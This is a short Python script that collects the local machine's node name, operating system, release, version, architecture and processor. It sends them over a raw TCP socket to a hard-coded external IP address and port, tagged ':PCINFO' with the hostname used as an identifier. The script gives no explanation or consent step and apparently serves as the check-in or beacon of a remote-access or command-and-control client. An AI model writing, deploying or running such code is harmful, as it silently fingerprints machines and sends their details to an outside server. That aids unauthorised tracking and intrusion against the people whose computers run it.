import platform
import socket

ip = '54.79.26.131'
port = 4570

system_info = platform.uname()
node_name = system_info.node  # This is the actual ID

# Only include info **excluding node name**, since it’s used as ID
System = f"System: {system_info.system}"
Release = f"Release: {system_info.release}"
Version = f"Version: {system_info.version}"
Machine = f"Machine: {system_info.machine}"
Processor = f"Processor: {system_info.processor}"

cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cow.connect((ip, port))
PCinfo = ":PCINFO\n" + node_name + "\n" + "\n".join([System, Release, Version, Machine, Processor])
cow.send(PCinfo.encode())
cow.close()